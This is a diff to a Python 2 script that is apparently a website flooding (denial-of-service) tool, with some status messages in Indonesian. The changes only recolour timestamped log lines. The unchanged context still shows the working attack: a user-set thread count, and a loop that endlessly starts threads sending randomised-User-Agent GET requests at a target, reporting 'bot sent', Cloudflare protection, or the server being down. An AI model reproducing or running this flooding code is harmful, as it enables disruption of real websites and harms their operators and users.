@@ -37,7 +37,7 @@ try:
 except:
    os.system("clear")
 
-   print ("{}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) + "{}]{} Website not found or Connection Failed,aborting".format(p,m))
+   print ("{}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) + "{}]{} Website not found or Connection Failed,aborting".format(p,m))
    sys.exit()
 
 thr = int(raw_input("[{}+{}] Speed (normal : 10) : ".format(m,p)))
@@ -49,11 +49,11 @@ def atk(proto):
       try:
 	a = requests.get(proto,headers = {'User-Agent': rand})
 	if (str(a)) == "<Response [200]>":
-	   print ("\t {}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) + "{}] {}Berhasil Mengirim Bot{} ".format(p,br,p))
+	   print ("\t {}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) + "{}] {}Berhasil Mengirim Bot{} ".format(p,br,p))
 	else:
-	   print ("\t {}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) + "{}] {}This Website Is Protected By Cloudflare {}".format(p,m,p))
+	   print ("\t {}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) + "{}] {}This Website Is Protected By Cloudflare {}".format(p,m,p))
       except requests.exceptions.ConnectionError:
-	print ("\t {}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) + "{}] {}No Connection Or Server Maybe Down{}".format(p,m,p))
+	print ("\t {}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) + "{}] {}No Connection Or Server Maybe Down{}".format(p,m,p))
 
 bi = ""
 
@@ -69,8 +69,8 @@ def lol(bi):
   while True:
    for i in range(thr):
     start_new_thread(atk,(ip,))
-    print ("\t {}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) +"{}] {}Thread...{}".format(p,br,p))
+    print ("\t {}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) +"{}] {}Thread...{}".format(p,br,p))
     time.sleep(0.25)
-   print ("\t {}[{}".format(p,m) + str(time.localtime()[3]) + "{}:{}".format(p,m) + str(time.localtime()[4]) + "{}:{}".format(p,m) + str(time.localtime()[5]) + "{}] {}Thread Already Full{}".format(p,m,p))
+   print ("\t {}[{}".format(p,h) + str(time.localtime()[3]) + "{}:{}".format(p,h) + str(time.localtime()[4]) + "{}:{}".format(p,h) + str(time.localtime()[5]) + "{}] {}Thread Already Full{}".format(p,m,p))
    time.sleep(2)
 lol(bi)
